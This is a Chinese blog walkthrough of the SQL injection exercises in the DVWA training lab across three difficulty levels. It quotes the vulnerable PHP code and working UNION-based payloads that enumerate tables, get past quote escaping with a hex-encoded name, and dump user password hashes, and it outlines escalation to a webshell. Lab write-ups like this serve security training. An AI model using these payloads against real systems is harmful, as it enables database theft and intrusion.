---
title: DVWA-SQL_Injection(SQL注入)
date: 2019-10-28 19:39:18
tags: [sql注入]
categories: sql注入
---

DVWA里的SQL注入。

<!--more-->

```
SQL 注入分类
按SQLMap中的分类来看，SQL注入类型有以下 5 种：
 UNION query SQL injection（可联合查询注入） 
 Stacked queries SQL injection（可多语句查询注入）
 Boolean-based blind SQL injection（布尔型注入） 
 Error-based SQL injection（报错型注入）
 Time-based blind SQL injection（基于时间延迟注入）
```

```
SQL 注入常规利用思路：
1、寻找注入点，可以通过 web 扫描工具实现 
2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 
3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）
4、可以通过获得的用户信息，寻找后台登录。 
5、利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。
```

```
手工注入常规思路：
1.判断是否存在注入，注入是字符型还是数字型 
2.猜解 SQL 查询语句中的字段数
3.确定显示的字段顺序 
4.获取当前数据库 
5.获取数据库中的表 
6.获取表中的字段名 
7.查询到账户的数据
```

### 级别：low

#### 查看源码

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

#### 分析：

由代码可知，通过`REQUEST`方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。

**常见注入测试的POC：**

- ... where user_id = $id   ---->   ... where user_id = 1 or 1024=1024
- ... where user_id = '$id'   ---->   ...where user_id = '1' or '1024'='1024'
- ... where user_id = "$id"   ---->   ... where user_id = "1" or "1024"="1024"

#### 判断是否存在注入，注入是字符型还是数字型

`输入1，查询成功：`

![KgwPW6.png](https://s2.ax1x.com/2019/10/28/KgwPW6.png)

`输入1'and '1' ='2，查询失败，返回结果为空：`

![KgwRt1.png](https://s2.ax1x.com/2019/10/28/KgwRt1.png)

`输入1' or '1'='1 页面正常，并返回更多信息，成功查询`

![Kg0wEd.png](https://s2.ax1x.com/2019/10/28/Kg0wEd.png)

**`判断存在的是字符型注入。`**

#### 猜解SQL查询语句中的字段数

`输入1' or 1=1 order by 1 #，查询成功： #是注释作用`

![KgDOhR.png](https://s2.ax1x.com/2019/10/28/KgDOhR.png)

`输入1' or 1=1 order by 2 #，查询成功： #是注释作用`

![KgrhUH.png](https://s2.ax1x.com/2019/10/28/KgrhUH.png)

`输入1' or 1=1 order by 3 #，查询失败： #是注释作用`

![KgsUzt.png](https://s2.ax1x.com/2019/10/28/KgsUzt.png)

 `说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。`

#### 确认显示的字段顺序

 `输入1' union select 1,2 #，查询成功： #是注释作用 `

![MQK7Of.png](https://s2.ax1x.com/2019/11/11/MQK7Of.png)

 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… 

#### 获取当前数据库

 `输入1' union select 1,database() #，查询成功：#是注释作用 `

![MQMl7D.png](https://s2.ax1x.com/2019/11/11/MQMl7D.png)

 说明当前的数据库为dvwa。 

#### 获取数据库中的表

`输入1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： #是注释作用`

![MQM7C9.png](https://s2.ax1x.com/2019/11/11/MQM7C9.png)

 说明数据库dvwa中一共有两个表，guestbook与users。 

#### 获取表中的字段名

`输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #，查询成功： #是注释作用`

![MQlbm6.png](https://s2.ax1x.com/2019/11/11/MQlbm6.png)

圈起来是是字段名

#### 下载数据

`输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用`

![MQ1ncn.png](https://s2.ax1x.com/2019/11/11/MQ1ncn.png)

 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 

### 级别：medium

#### 分析

 Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 

![MlYjiV.png](https://s2.ax1x.com/2019/11/11/MlYjiV.png)

 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 

####  **判断是否存在注入，注入是字符型还是数字型** 

 `抓包更改参数id为1' or 1=1 # 报错： #是注释作用 `

![MlNW38.png](https://s2.ax1x.com/2019/11/11/MlNW38.png)

![MlNhjg.png](https://s2.ax1x.com/2019/11/11/MlNhjg.png)

![MlNIBj.png](https://s2.ax1x.com/2019/11/11/MlNIBj.png)

 `抓包更改参数id为1 or 1=1 #，查询成功：` 

![MlUAgO.png](https://s2.ax1x.com/2019/11/11/MlUAgO.png)

![MlUEvD.png](https://s2.ax1x.com/2019/11/11/MlUEvD.png)

 `说明存在数字型注入。 `

 由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。 

####  **猜解SQL查询语句中的字段数** 

` 抓包更改参数id为1 order by 2 #，查询成功： `

![MlwIzV.png](https://s2.ax1x.com/2019/11/11/MlwIzV.png)

` 抓包更改参数id为1 order by 3 #，报错： `

![MlwLdJ.png](https://s2.ax1x.com/2019/11/11/MlwLdJ.png)

` 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 `

####  **确定显示的字段顺序** 

 `抓包更改参数id为1 union select 1,2 #，查询成功： `

![Ml0JWq.png](https://s2.ax1x.com/2019/11/11/Ml0JWq.png)

 说明执行的SQL语句为select First name,Surname from 表 where ID=id… 

####  **获取当前数据库** 

 `抓包更改参数id为1 union select 1,database() #，查询成功： `

![Ml0j0g.png](https://s2.ax1x.com/2019/11/11/Ml0j0g.png)

` 说明当前的数据库为dvwa。 `

####  **获取数据库中的表** 

`抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：`

![MlBK91.png](https://s2.ax1x.com/2019/11/11/MlBK91.png)

` 说明数据库dvwa中一共有两个表，guestbook与users。 `

####  **获取表中的字段名** 

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：`

![Mls0jx.png](https://s2.ax1x.com/2019/11/11/Mls0jx.png)

 这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过 '' 

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功：`![MlrFwF.png](https://s2.ax1x.com/2019/11/11/MlrFwF.png)

` 说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。 `

####  **下载数据** 

`抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![MlraOf.png](https://s2.ax1x.com/2019/11/11/MlraOf.png)

### 级别：high

#### SQL Injection Source

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?>
```

####  **分析：** 

 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 

####  **漏洞利用:** 

 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 

`输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![M3q1r6.png](https://s2.ax1x.com/2019/11/12/M3q1r6.png)

**特别注意：**High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

**参考链接：** https://www.jianshu.com/p/e51cd8f15a84 

